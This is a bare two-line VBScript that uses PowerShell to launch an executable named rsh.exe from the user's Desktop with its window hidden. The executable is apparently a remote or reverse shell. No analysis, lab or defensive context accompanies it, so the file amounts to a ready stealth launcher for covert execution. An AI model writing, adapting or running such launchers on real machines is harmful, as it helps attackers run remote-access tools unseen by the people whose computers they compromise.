Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -Command ""Start-Process '%USERPROFILE%\Desktop\rsh.exe' -WindowStyle Hidden""", 0, False